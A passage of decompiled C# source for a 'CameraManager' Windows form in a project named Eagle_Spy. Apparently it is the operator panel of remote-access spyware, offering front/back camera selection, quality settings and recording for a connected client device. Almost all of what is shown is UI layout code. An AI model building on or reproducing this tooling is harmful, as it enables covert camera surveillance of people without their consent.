using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class CameraManager : Form
{
	public delegate void addsizedele(object[] objs);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("CAM0")]
	private PictureBox _CAM0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Frames")]
	private Timer _Frames;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Sbtn")]
	private DrakeUIButton _Sbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button3")]
	private DrakeUIAvatar _Button3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIAvatar2")]
	private DrakeUIAvatar _DrakeUIAvatar2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savetimer")]
	private Timer _savetimer;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("startbtn")]
	private DrakeUIButton _startbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("hidetoolbtn")]
	private DrakeUIButtonIcon _hidetoolbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("pinbtn")]
	private DrakeUIButtonIcon _pinbtn;

	public Client classCamera;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	private bool MouseState;

	public int FPS;

	public int FPSTMP;

	public string SizeFrame;

	public PictureBox TempImage;

	public string KEYsx;

	public string tmpFolderUSER;

	public bool boSave;

	public bool Rotateit;

	public string SelectedCamera;

	public string CamerID;

	public bool Changed;

	private int frameRate;

	private bool newphoto;

	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	private const uint SWP_NOSIZE = 1u;

	private const uint SWP_NOMOVE = 2u;

	private const uint TOPMOST_FLAGS = 3u;

	private bool keepmeto;

	internal PictureBox CAM0
    ;

    internal Timer Frames
    ;

    internal Timer TOpacity
	;

	[field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
    ;

    [field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
    ;
    [field: AccessedThroughProperty("ClientPic")]
	internal PictureBox ClientPic
    ;

    [field: AccessedThroughProperty("Label1")]
	internal Label Label1
    ;

    [field: AccessedThroughProperty("cmbofoucs")]
	internal ComboBox cmbofoucs
    ;

    [field: AccessedThroughProperty("Label2")]
	internal Label Label2
    ;

    [field: AccessedThroughProperty("Panel4")]
	internal Panel Panel4
    ;

    [field: AccessedThroughProperty("statustext")]
	internal Label statustext
    ;

    [field: AccessedThroughProperty("ToolTip1")]
	internal ToolTip ToolTip1
    ;

    internal DrakeUIButton Sbtn
	;

	[field: AccessedThroughProperty("DrakeUILampLED1")]
	internal DrakeUILampLED DrakeUILampLED1
;

    [field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal DrakeUIToolTip DrakeUIToolTip1
    ;

    internal DrakeUIAvatar Button3
;

	internal DrakeUIAvatar DrakeUIAvatar2
;

	[field: AccessedThroughProperty("combotext")]
	internal Label combotext
    ;

    [field: AccessedThroughProperty("combosizes")]
	internal DrakeUIComboBox combosizes
    ;

    [field: AccessedThroughProperty("qultytext")]
	internal Label qultytext
;

    [field: AccessedThroughProperty("comboqualty")]
    internal DrakeUIComboBox comboqualty
    ;

    internal Timer savetimer
	;

	[field: AccessedThroughProperty("fpstext")]
	internal Label fpstext
    ;

    [field: AccessedThroughProperty("combocam")]
	internal DrakeUIComboBox combocam
    ;

    internal DrakeUIButton startbtn
	;

	internal DrakeUIButtonIcon hidetoolbtn
	;

	internal DrakeUIButtonIcon pinbtn
	;
    internal DrakeUIButtonIcon drakeUIButtonIcon2;
    internal DrakeUIButtonIcon drakeUIButtonIcon1;
    [field: AccessedThroughProperty("Panel3")]
	internal Panel Panel3
    ;

    public CameraManager()
	{
		base.Load += CameraManager_Load;
		base.FormClosing += CameraManager_FormClosing;
		Title = "null";
		MouseState = false;
		FPS = 0;
		FPSTMP = 0;
		SizeFrame = "0 kb";
		TempImage = null;
		KEYsx = "None";
		tmpFolderUSER = "";
		boSave = false;
		Rotateit = false;
		SelectedCamera = "";
		CamerID = "null";
		Changed = false;
		frameRate = 25;
		newphoto = false;
		keepmeto = false;
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.CAM0 = new System.Windows.Forms.PictureBox();
            this.Frames = new System.Windows.Forms.Timer(this.components);
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.Panel1 = new System.Windows.Forms.Panel();
            this.DrakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
            this.DrakeUILampLED1 = new DrakeUI.Framework.DrakeUILampLED();
            this.combocam = new DrakeUI.Framework.DrakeUIComboBox();
            this.drakeUIButtonIcon2 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.qultytext = new System.Windows.Forms.Label();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            this.drakeUIButtonIcon1 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.combotext = new System.Windows.Forms.Label();
            this.comboqualty = new DrakeUI.Framework.DrakeUIComboBox();
            this.combosizes = new DrakeUI.Framework.DrakeUIComboBox();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.pinbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.hidetoolbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Button3 = new DrakeUI.Framework.DrakeUIAvatar();
            this.Sbtn = new DrakeUI.Framework.DrakeUIButton();
            this.startbtn = new DrakeUI.Framework.DrakeUIButton();
            this.fpstext = new System.Windows.Forms.Label();
            this.Panel4 = new System.Windows.Forms.Panel();
            this.statustext = new System.Windows.Forms.Label();
            this.Label2 = new System.Windows.Forms.Label();
            this.cmbofoucs = new System.Windows.Forms.ComboBox();
            this.Label1 = new System.Windows.Forms.Label();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.ToolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.savetimer = new System.Windows.Forms.Timer(this.components);
            ((System.ComponentModel.ISupportInitialize)(this.CAM0)).BeginInit();
            this.Panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            this.Panel3.SuspendLayout();
            this.Panel4.SuspendLayout();
            this.Panel2.SuspendLayout();
            this.SuspendLayout();
            // 
            // CAM0
            // 
            this.CAM0.BackColor = System.Drawing.Color.Black;
            this.CAM0.Location = new System.Drawing.Point(3, 52);
            this.CAM0.Name = "CAM0";
            this.CAM0.Size = new System.Drawing.Size(597, 530);
            this.CAM0.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.CAM0.TabIndex = 0;
            this.CAM0.TabStop = false;
            this.CAM0.MouseLeave += new System.EventHandler(this.CAM0_MouseLeave);
            this.CAM0.MouseHover += new System.EventHandler(this.CAM0_MouseHover);
            // 
            // Frames
            // 
            this.Frames.Interval = 1000;
            this.Frames.Tick += new System.EventHandler(this.Frames_Tick);
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // Panel1
            // 
            this.Panel1.Controls.Add(this.DrakeUIAvatar2);
            this.Panel1.Controls.Add(this.DrakeUILampLED1);
            this.Panel1.Controls.Add(this.combocam);
            this.Panel1.Controls.Add(this.drakeUIButtonIcon2);
            this.Panel1.Controls.Add(this.qultytext);
            this.Panel1.Controls.Add(this.ClientPic);
            this.Panel1.Controls.Add(this.drakeUIButtonIcon1);
            this.Panel1.Controls.Add(this.combotext);
            this.Panel1.Controls.Add(this.comboqualty);
            this.Panel1.Controls.Add(this.combosizes);
            this.Panel1.Controls.Add(this.CAM0);
            this.Panel1.Controls.Add(this.Panel3);
            this.Panel1.Controls.Add(this.Sbtn);
            this.Panel1.Controls.Add(this.startbtn);
            this.Panel1.Location = new System.Drawing.Point(0, 1);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(602, 601);
            this.Panel1.TabIndex = 3;
            // 
            // DrakeUIAvatar2
            // 
            this.DrakeUIAvatar2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.DrakeUIAvatar2.AvatarSize = 30;
            this.DrakeUIAvatar2.BackColor = System.Drawing.Color.Transparent;
            this.DrakeUIAvatar2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIAvatar2.FillColor = System.Drawing.Color.Black;
            this.DrakeUIAvatar2.Font = new System.Drawing.Font("Calibri", 9F);
            this.DrakeUIAvatar2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIAvatar2.Location = new System.Drawing.Point(536, 10);
            this.DrakeUIAvatar2.Margin = new System.Windows.Forms.Padding(4);
            this.DrakeUIAvatar2.Name = "DrakeUIAvatar2";
            this.DrakeUIAvatar2.Size = new System.Drawing.Size(34, 28);
            this.DrakeUIAvatar2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIAvatar2.StyleCustomMode = true;
            this.DrakeUIAvatar2.Symbol = 61470;
            this.DrakeUIAvatar2.SymbolSize = 25;
            this.DrakeUIAvatar2.TabIndex = 28;
            this.DrakeUIAvatar2.Tag = "off";
            this.DrakeUIAvatar2.Text = "DrakeUIAvatar1";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUIAvatar2, "Rotate");
            this.DrakeUIAvatar2.Click += new System.EventHandler(this.DrakeUIAvatar2_Click);
            // 
            // DrakeUILampLED1
            // 
            this.DrakeUILampLED1.Color = System.Drawing.Color.Lime;
            this.DrakeUILampLED1.Enabled = false;
            this.DrakeUILampLED1.Location = new System.Drawing.Point(460, 12);
            this.DrakeUILampLED1.Name = "DrakeUILampLED1";
            this.DrakeUILampLED1.Size = new System.Drawing.Size(31, 31);
            this.DrakeUILampLED1.TabIndex = 22;
            this.DrakeUILampLED1.Text = "DrakeUILampLED1";
            this.DrakeUIToolTip1.SetToolTip(this.DrakeUILampLED1, "Saving...");
            this.DrakeUILampLED1.Visible = false;
            // 
            // combocam
            // 
            this.combocam.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.combocam.FillColor = System.Drawing.Color.Black;
            this.combocam.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.combocam.ForeColor = System.Drawing.Color.White;
            this.combocam.Items.AddRange(new object[] {
            "Front",
            "Back"});
            this.combocam.Location = new System.Drawing.Point(295, 12);
            this.combocam.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.combocam.MaxDropDownItems = 25;
            this.combocam.MinimumSize = new System.Drawing.Size(63, 0);
            this.combocam.Name = "combocam";
            this.combocam.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.combocam.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.combocam.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.combocam.Size = new System.Drawing.Size(125, 26);
            this.combocam.Style = DrakeUI.Framework.UIStyle.Custom;
            this.combocam.StyleCustomMode = true;
            this.combocam.TabIndex = 45;
            this.combocam.Text = "Front";
            this.combocam.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // drakeUIButtonIcon2
            // 
            this.drakeUIButtonIcon2.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon2.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon2.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon2.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon2.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon2.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon2.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon2.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.drakeUIButtonIcon2.Location = new System.Drawing.Point(189, 3);
            this.drakeUIButtonIcon2.Name = "drakeUIButtonIcon2";
            this.drakeUIButtonIcon2.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon2.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon2.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon2.Size = new System.Drawing.Size(77, 43);
            this.drakeUIButtonIcon2.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon2.Symbol = 61764;
            this.drakeUIButtonIcon2.SymbolSize = 30;
            this.drakeUIButtonIcon2.TabIndex = 53;
            this.drakeUIButtonIcon2.Text = "START";
            this.drakeUIButtonIcon2.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.drakeUIButtonIcon2.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon2.Click += new System.EventHandler(this.drakeUIButtonIcon2_Click);
            // 
            // qultytext
            // 
            this.qultytext.Font = new System.Drawing.Font("Calibri", 8.7F, System.Drawing.FontStyle.Bold);
            this.qultytext.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.qultytext.Location = new System.Drawing.Point(859, 404);
            this.qultytext.Name = "qultytext";
            this.qultytext.Size = new System.Drawing.Size(78, 28);
            this.qultytext.TabIndex = 42;
            this.qultytext.Text = "Quality";
            this.qultytext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // ClientPic
            // 
            this.ClientPic.BackColor = System.Drawing.Color.Transparent;
            this.ClientPic.Location = new System.Drawing.Point(7, 6);
            this.ClientPic.Name = "ClientPic";
            this.ClientPic.Size = new System.Drawing.Size(48, 39);
            this.ClientPic.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.ClientPic.TabIndex = 11;
            this.ClientPic.TabStop = false;
            // 
            // drakeUIButtonIcon1
            // 
            this.drakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
            this.drakeUIButtonIcon1.FillColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon1.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F);
            this.drakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.drakeUIButtonIcon1.ForeDisableColor = System.Drawing.Color.Red;
            this.drakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.Blue;
            this.drakeUIButtonIcon1.ForePressColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon1.ForeSelectedColor = System.Drawing.Color.Lime;
            this.drakeUIButtonIcon1.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
            this.drakeUIButtonIcon1.Location = new System.Drawing.Point(87, 3);
            this.drakeUIButtonIcon1.Name = "drakeUIButtonIcon1";
            this.drakeUIButtonIcon1.RadiusSides = DrakeUI.Framework.UICornerRadiusSides.None;
            this.drakeUIButtonIcon1.RectColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectPressColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.Black;
            this.drakeUIButtonIcon1.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.None;
            this.drakeUIButtonIcon1.Size = new System.Drawing.Size(69, 43);
            this.drakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.drakeUIButtonIcon1.Symbol = 62091;
            this.drakeUIButtonIcon1.SymbolSize = 30;
            this.drakeUIButtonIcon1.TabIndex = 52;
            this.drakeUIButtonIcon1.Text = "STOP";
            this.drakeUIButtonIcon1.TextAlign = System.Drawing.ContentAlignment.MiddleRight;
            this.drakeUIButtonIcon1.TipsFont = new System.Drawing.Font("Bahnschrift", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.drakeUIButtonIcon1.Click += new System.EventHandler(this.drakeUIButtonIcon1_Click_2);
            // 
            // combotext
            // 
            this.combotext.Font = new System.Drawing.Font("Calibri", 8.7F, System.Drawing.FontStyle.Bold);
            this.combotext.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.combotext.Location = new System.Drawing.Point(873, 378);
            this.combotext.Name = "combotext";
            this.combotext.Size = new System.Drawing.Size(65, 26);
            this.combotext.TabIndex = 40;
            this.combotext.Text = "Size";
            this.combotext.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // comboqualty
            // 
            this.comboqualty.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.comboqualty.FillColor = System.Drawing.Color.Black;
            this.comboqualty.Font = new System.Drawing.Font("Calibri", 9F);
            this.comboqualty.ForeColor = System.Drawing.Color.White;
            this.comboqualty.Items.AddRange(new object[] {
            "10",
            "20",
            "30",
            "40",
            "50",
            "60",
            "70",
            "80",
            "90",
            "100"});
            this.comboqualty.Location = new System.Drawing.Point(855, 319);
            this.comboqualty.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.comboqualty.MaxDropDownItems = 25;
            this.comboqualty.MinimumSize = new System.Drawing.Size(63, 0);
            this.comboqualty.Name = "comboqualty";
            this.comboqualty.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.comboqualty.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.comboqualty.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.comboqualty.Size = new System.Drawing.Size(82, 22);
            this.comboqualty.Style = DrakeUI.Framework.UIStyle.Custom;
            this.comboqualty.StyleCustomMode = true;
            this.comboqualty.TabIndex = 43;
            this.comboqualty.Text = "70";
            this.comboqualty.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // combosizes
            // 
            this.combosizes.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.combosizes.FillColor = System.Drawing.Color.Black;
            this.combosizes.Font = new System.Drawing.Font("Calibri", 9F);
            this.combosizes.ForeColor = System.Drawing.Color.White;
            this.combosizes.Location = new System.Drawing.Point(822, 351);
            this.combosizes.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.combosizes.MaxDropDownItems = 25;
            this.combosizes.MinimumSize = new System.Drawing.Size(63, 0);
            this.combosizes.Name = "combosizes";
            this.combosizes.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.combosizes.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.combosizes.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.combosizes.Size = new System.Drawing.Size(115, 22);
            this.combosizes.Style = DrakeUI.Framework.UIStyle.Custom;
            this.combosizes.StyleCustomMode = true;
            this.combosizes.TabIndex = 41;
            this.combosizes.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // Panel3
            // 
            this.Panel3.BackColor = System.Drawing.Color.Black;
            this.Panel3.Controls.Add(this.pinbtn);
            this.Panel3.Controls.Add(this.hidetoolbtn);
            this.Panel3.Controls.Add(this.Button3);
            this.Panel3.Dock = System.Windows.Forms.DockStyle.Right;
            this.Panel3.Location = new System.Drawing.Point(592, 0);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(10, 601);
            this.Panel3.TabIndex = 30;
            // 
            // pinbtn
            // 
            this.pinbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.pinbtn.BackColor = System.Drawing.Color.Transparent;
            this.pinbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.pinbtn.FillColor = System.Drawing.Color.Transparent;
            this.pinbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.pinbtn.ForeColor = System.Drawing.Color.Red;
            this.pinbtn.Location = new System.Drawing.Point(-39, 467);
            this.pinbtn.Name = "pinbtn";
            this.pinbtn.RectColor = System.Drawing.Color.Transparent;
            this.pinbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.pinbtn.Size = new System.Drawing.Size(34, 25);
            this.pinbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.pinbtn.Symbol = 61581;
            this.pinbtn.SymbolSize = 30;
            this.pinbtn.TabIndex = 29;
            this.pinbtn.TagString = "s";
            this.DrakeUIToolTip1.SetToolTip(this.pinbtn, "PIN");
            this.pinbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click_1);
            // 
            // hidetoolbtn
            // 
            this.hidetoolbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.hidetoolbtn.BackColor = System.Drawing.Color.Transparent;
            this.hidetoolbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.hidetoolbtn.FillColor = System.Drawing.Color.Transparent;
            this.hidetoolbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.hidetoolbtn.ForeColor = System.Drawing.Color.Red;
            this.hidetoolbtn.Location = new System.Drawing.Point(-39, 498);
            this.hidetoolbtn.Name = "hidetoolbtn";
            this.hidetoolbtn.RectColor = System.Drawing.Color.Transparent;
            this.hidetoolbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.hidetoolbtn.Size = new System.Drawing.Size(34, 25);
            this.hidetoolbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.hidetoolbtn.Symbol = 61550;
            this.hidetoolbtn.SymbolSize = 30;
            this.hidetoolbtn.TabIndex = 2;
            this.hidetoolbtn.TagString = "s";
            this.DrakeUIToolTip1.SetToolTip(this.hidetoolbtn, "Hide/Show Tools");
            this.hidetoolbtn.Click += new System.EventHandler(this.DrakeUIButtonIcon1_Click);
            // 
            // Button3
            // 
            this.Button3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right)));
            this.Button3.AvatarSize = 30;
            this.Button3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Button3.FillColor = System.Drawing.Color.Black;
            this.Button3.Font = new System.Drawing.Font("Calibri", 12F);
            this.Button3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Button3.Location = new System.Drawing.Point(-39, 566);
            this.Button3.Margin = new System.Windows.Forms.Padding(4);
            this.Button3.Name = "Button3";
            this.Button3.Size = new System.Drawing.Size(34, 28);
            this.Button3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Button3.StyleCustomMode = true;
            this.Button3.Symbol = 61469;
            this.Button3.SymbolSize = 30;
            this.Button3.TabIndex = 26;
            this.Button3.Tag = "off";
            this.Button3.Text = "DrakeUIAvatar1";
            this.DrakeUIToolTip1.SetToolTip(this.Button3, "Record");
            this.Button3.Click += new System.EventHandler(this.Addpo_Click);
            // 
            // Sbtn
            // 
            this.Sbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Sbtn.Enabled = false;
            this.Sbtn.FillColor = System.Drawing.Color.Black;
            this.Sbtn.FillDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.Sbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.Sbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Sbtn.Location = new System.Drawing.Point(851, 283);
            this.Sbtn.Name = "Sbtn";
            this.Sbtn.Radius = 15;
            this.Sbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Sbtn.RectDisableColor = System.Drawing.Color.White;
            this.Sbtn.Size = new System.Drawing.Size(87, 28);
            this.Sbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Sbtn.TabIndex = 20;
            this.Sbtn.Text = "Stop";
            this.DrakeUIToolTip1.SetToolTip(this.Sbtn, "Stop Camera");
            this.Sbtn.Click += new System.EventHandler(this.DrakeUIButton2_Click);
            // 
            // startbtn
            // 
            this.startbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.startbtn.FillColor = System.Drawing.Color.Black;
            this.startbtn.FillDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(25)))), ((int)(((byte)(25)))));
            this.startbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.startbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.startbtn.Location = new System.Drawing.Point(851, 249);
            this.startbtn.Name = "startbtn";
            this.startbtn.Radius = 15;
            this.startbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.startbtn.RectDisableColor = System.Drawing.Color.White;
            this.startbtn.Size = new System.Drawing.Size(87, 28);
            this.startbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.startbtn.StyleCustomMode = true;
            this.startbtn.TabIndex = 44;
            this.startbtn.Text = "Start";
            this.DrakeUIToolTip1.SetToolTip(this.startbtn, "Stop Camera");
            this.startbtn.Click += new System.EventHandler(this.DrakeUIButton1_Click_3);
            // 
            // fpstext
            // 
            this.fpstext.BackColor = System.Drawing.Color.Transparent;
            this.fpstext.Font = new System.Drawing.Font("Calibri", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.fpstext.ForeColor = System.Drawing.Color.Lime;
            this.fpstext.Location = new System.Drawing.Point(722, -1);
            this.fpstext.Name = "fpstext";
            this.fpstext.Size = new System.Drawing.Size(162, 10);
            this.fpstext.TabIndex = 1;
            this.fpstext.Text = "...";
            this.fpstext.UseMnemonic = false;
            // 
            // Panel4
            // 
            this.Panel4.BackColor = System.Drawing.Color.Black;
            this.Panel4.Controls.Add(this.statustext);
            this.Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel4.Location = new System.Drawing.Point(0, 586);
            this.Panel4.Name = "Panel4";
            this.Panel4.Size = new System.Drawing.Size(602, 16);
            this.Panel4.TabIndex = 1;
            // 
